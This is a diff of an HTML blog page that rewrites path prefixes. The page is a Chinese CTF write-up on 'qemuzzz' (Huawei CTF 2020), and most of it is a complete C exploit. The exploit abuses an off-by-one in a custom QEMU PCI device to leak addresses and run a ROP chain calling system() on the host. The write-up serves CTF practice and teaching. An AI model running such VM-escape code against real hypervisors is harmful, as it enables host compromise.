@@ -5,42 +5,42 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="存在一个off by one，可以多读取或写入一个字节  其中buf后面是设备obj指针，由于读写会用到这个指针，因此，我们可以修改obj指针的低1字节，使得phys_addr、length、pos、obj、以及cpu_physical_memory_rw函数指针等字段偏移到buf可控区里。   同时cpu_physical_memory_rw是以原来对象指针来取得，而不是从obj，因此可以通过修">
 <meta property="og:type" content="article">
 <meta property="og:title" content="华为CTF2020第一场_qemuzzz_1">
-<meta property="og:url" content="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/index.html">
+<meta property="og:url" content="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="存在一个off by one，可以多读取或写入一个字节  其中buf后面是设备obj指针，由于读写会用到这个指针，因此，我们可以修改obj指针的低1字节，使得phys_addr、length、pos、obj、以及cpu_physical_memory_rw函数指针等字段偏移到buf可控区里。   同时cpu_physical_memory_rw是以原来对象指针来取得，而不是从obj，因此可以通过修">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/5.png">
+<meta property="og:image" content="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/1.png">
+<meta property="og:image" content="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/2.png">
+<meta property="og:image" content="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/3.png">
+<meta property="og:image" content="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/4.png">
+<meta property="og:image" content="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/5.png">
 <meta property="article:published_time" content="2020-12-21T00:39:04.000Z">
 <meta property="article:modified_time" content="2025-06-26T05:56:28.230Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="off by one">
 <meta property="article:tag" content="QEMU">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/1.png">
+<meta name="twitter:image" content="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/">
+<link rel="canonical" href="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/">
 
 
 <script id="page-configurations">
@@ -102,7 +102,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -123,27 +123,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -201,10 +201,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -239,7 +239,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -262,16 +262,16 @@
 
       
         <p>存在一个off by one，可以多读取或写入一个字节</p>
-<img src="/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/1.png" class="">
+<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/1.png" class="">
 <p>其中buf后面是设备obj指针，由于读写会用到这个指针，因此，我们可以修改obj指针的低1字节，使得phys_addr、length、pos、obj、以及cpu_physical_memory_rw函数指针等字段偏移到buf可控区里。</p>
-<img src="/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/2.png" class="">
+<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/2.png" class="">
 
 <p>同时cpu_physical_memory_rw是以原来对象指针来取得，而不是从obj，因此可以通过修改后的obj的buf来写cpu_physical_memory_rw指针。</p>
-<img src="/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/3.png" class="">
+<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/3.png" class="">
 <p>由于offset等字段的设置不是为obj指针设置，而是原来位置设置</p>
-<img src="/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/4.png" class="">
+<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/4.png" class="">
 <p>因此可以使用异或操作来将length1的低1位取反，进而可以在读操作完成后进行最后一步写操作。</p>
-<img src="/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/5.png" class="">
+<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/5.png" class="">
 <p>exp</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_MASK ((((size_t)1)&lt;&lt;54)-1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *mmio;</span><br><span class="line"><span class="comment">/*我们程序的缓冲在虚拟机里对应的物理地址*/</span></span><br><span class="line"><span class="type">size_t</span> buffer_phys_addr;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">   perror(msg);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写设备内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">   *((<span class="type">uint32_t</span> *)(mmio + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读设备内存</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setPhyAddr</span><span class="params">(<span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">   mmio_write(<span class="number">32</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setPos</span><span class="params">(<span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">   mmio_write(<span class="number">16</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setLength</span><span class="params">(<span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">   mmio_write(<span class="number">24</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">enc</span><span class="params">()</span> &#123;</span><br><span class="line">   mmio_write(<span class="number">80</span>,<span class="number">0x666</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mem_read_write</span><span class="params">(<span class="type">uint32_t</span> phyAddr,<span class="type">uint32_t</span> pos,<span class="type">uint32_t</span> length)</span> &#123;</span><br><span class="line">   setPhyAddr(phyAddr);</span><br><span class="line">   setPos(pos);</span><br><span class="line">   setLength(length);</span><br><span class="line">   mmio_write(<span class="number">96</span>,<span class="number">0x666</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_phys_addr</span><span class="params">(<span class="type">char</span> *vir_addr)</span> &#123;</span><br><span class="line">   <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY); <span class="comment">/*打开页映射表*/</span></span><br><span class="line">   <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">      die(<span class="string">&quot;open pagemap error&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="type">size_t</span> vir = (<span class="type">size_t</span>)vir_addr;</span><br><span class="line">   <span class="comment">// /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移</span></span><br><span class="line">   <span class="type">size_t</span> offset = vir / <span class="number">0x1000</span> * <span class="number">8</span>;</span><br><span class="line">   <span class="keyword">if</span> (lseek(fd,offset,SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">      die(<span class="string">&quot;lseek pagemap error&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="type">size_t</span> addr;</span><br><span class="line">   <span class="keyword">if</span> (read(fd,&amp;addr,<span class="number">8</span>) != <span class="number">8</span>) &#123;</span><br><span class="line">      die(<span class="string">&quot;read pagemap error&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   addr = (addr &amp; PFN_MASK);</span><br><span class="line">   <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> ** argv)</span> &#123;</span><br><span class="line">   <span class="comment">//打开设备</span></span><br><span class="line">   <span class="type">int</span> fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">      die(<span class="string">&quot;open device error&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//映射设备内存</span></span><br><span class="line">   mmio = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (mmio == MAP_FAILED) &#123;</span><br><span class="line">      die(<span class="string">&quot;mmap device memory error&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/*映射一块缓冲区*/</span></span><br><span class="line">   buffer = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (buffer == MAP_FAILED) &#123;</span><br><span class="line">      die(<span class="string">&quot;mmap local buffer error&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//必须锁住内存，才能准确获得物理地址</span></span><br><span class="line">   mlock(buffer, <span class="number">0x1000</span>);</span><br><span class="line">   <span class="comment">//获得buffer的物理映射地址</span></span><br><span class="line">   buffer_phys_addr = get_phys_addr(buffer);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;buffer_phys_addr=0x%lx\n&quot;</span>,buffer_phys_addr);</span><br><span class="line">   <span class="type">size_t</span> *d = (<span class="type">size_t</span> *)buffer;</span><br><span class="line">   d[<span class="number">0</span>] = buffer_phys_addr * <span class="number">0x1000</span>;</span><br><span class="line">   d[<span class="number">1</span>] = (<span class="number">0xFD0</span> &lt;&lt; <span class="number">16</span>) | <span class="number">0x11</span>;</span><br><span class="line">   mem_read_write(buffer_phys_addr,<span class="number">0x20</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//Off by one读取对象指针低1字节</span></span><br><span class="line">   mem_read_write(buffer_phys_addr,<span class="number">0xFFF</span>,<span class="number">0x3</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;obj_addr_low_bit=0x%x\n&quot;</span>,buffer[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">   buffer[<span class="number">1</span>] = buffer[<span class="number">1</span>] + <span class="number">0x30</span>;</span><br><span class="line">   <span class="comment">//Off by one使得对象指针下移</span></span><br><span class="line">   mem_read_write(buffer_phys_addr,<span class="number">0xFFF</span>,<span class="number">0x2</span>);</span><br><span class="line">   <span class="comment">//泄露cpu_physical_memory_rw地址</span></span><br><span class="line">   mem_read_write(buffer_phys_addr,<span class="number">0xFD0</span>,<span class="number">0x7</span>);</span><br><span class="line">   <span class="type">size_t</span> obj_addr = d[<span class="number">0</span>] - <span class="number">0x30</span>;</span><br><span class="line">   <span class="type">size_t</span> elf_base = d[<span class="number">1</span>] - <span class="number">0x5bc5c0</span>;</span><br><span class="line">   <span class="type">size_t</span> system_addr = elf_base + <span class="number">0x2A7A80</span>;</span><br><span class="line">   <span class="comment">//push rsi ; pop rsp ; clc ; jmp qword ptr [rsi + 0xf]</span></span><br><span class="line">   <span class="type">size_t</span> gadget = elf_base + <span class="number">0x0000000000321956</span>;</span><br><span class="line">   <span class="type">size_t</span> pop_rdi = elf_base + <span class="number">0x00000000002ad4a5</span>;</span><br><span class="line">   <span class="type">size_t</span> pop_rsp = elf_base + <span class="number">0x00000000002ad883</span>;</span><br><span class="line">   <span class="comment">/*pop rax ; pop rbx ; pop rbp ; ret*/</span></span><br><span class="line">   <span class="type">size_t</span> pop_3 = elf_base + <span class="number">0x00000000003b15ff</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;obj_addr=0x%lx\n&quot;</span>,obj_addr);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;elf_base=0x%lx\n&quot;</span>,elf_base);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;system_addr=0x%lx\n&quot;</span>,system_addr);</span><br><span class="line"></span><br><span class="line">   setPos(<span class="number">0x28</span>);</span><br><span class="line">   setLength((<span class="number">0x28</span>+<span class="number">0x4</span>) * <span class="number">2</span>);</span><br><span class="line">   enc();</span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(buffer,<span class="number">0</span>,<span class="number">0x1f</span>);</span><br><span class="line">   <span class="built_in">memcpy</span>(buffer+<span class="number">0x1f</span>,&amp;pop_3,<span class="number">0x8</span>); <span class="comment">//</span></span><br><span class="line">   <span class="comment">//rop</span></span><br><span class="line">   d = (<span class="type">size_t</span> *)(buffer + <span class="number">0x28</span>);</span><br><span class="line">   d[<span class="number">0</span>] = pop_rsp;</span><br><span class="line">   d[<span class="number">1</span>] = obj_addr+<span class="number">0xe19</span> + <span class="number">0x47</span> + <span class="number">0x9e0</span>;</span><br><span class="line"></span><br><span class="line">   d = (<span class="type">size_t</span> *)(buffer + <span class="number">0x47</span>);</span><br><span class="line">   d[<span class="number">0</span>] = pop_rdi;</span><br><span class="line">   d[<span class="number">1</span>] = obj_addr+<span class="number">0xe19</span> + <span class="number">0x5f</span> + <span class="number">0x9e0</span>;</span><br><span class="line">   d[<span class="number">2</span>] = system_addr;</span><br><span class="line">   <span class="built_in">memcpy</span>(buffer+<span class="number">0x5f</span>,<span class="string">&quot;cat flag&quot;</span>,<span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">   d = (<span class="type">size_t</span> *)(buffer + <span class="number">0x1f7</span>);</span><br><span class="line">   d[<span class="number">0</span>] = obj_addr+<span class="number">0xe19</span>;</span><br><span class="line">   d[<span class="number">1</span>] = gadget;</span><br><span class="line">   mem_read_write(buffer_phys_addr,<span class="number">0x666</span>,<span class="number">0x6</span>);</span><br><span class="line">   <span class="comment">//getchar();</span></span><br><span class="line">   <span class="comment">//getshell</span></span><br><span class="line">   mem_read_write(buffer_phys_addr,<span class="number">0x666</span>,<span class="number">0x6</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
     </div>
@@ -282,8 +282,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/off-by-one/" rel="tag"># off by one</a>
-              <a href="/ha1vk/tags/QEMU/" rel="tag"># QEMU</a>
+              <a href="/tags/off-by-one/" rel="tag"># off by one</a>
+              <a href="/tags/QEMU/" rel="tag"># QEMU</a>
           </div>
 
         
@@ -292,11 +292,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/12/17/qwb2020-final-GOOexec/" rel="prev" title="强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）">
+    <a href="/2020/12/17/qwb2020-final-GOOexec/" rel="prev" title="强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）">
       <i class="fa fa-chevron-left"></i> 强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-fastexec/" rel="next" title="华为CTF2020第一场_fastexec">
+    <a href="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-fastexec/" rel="next" title="华为CTF2020第一场_fastexec">
       华为CTF2020第一场_fastexec <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -368,20 +368,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -454,30 +454,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
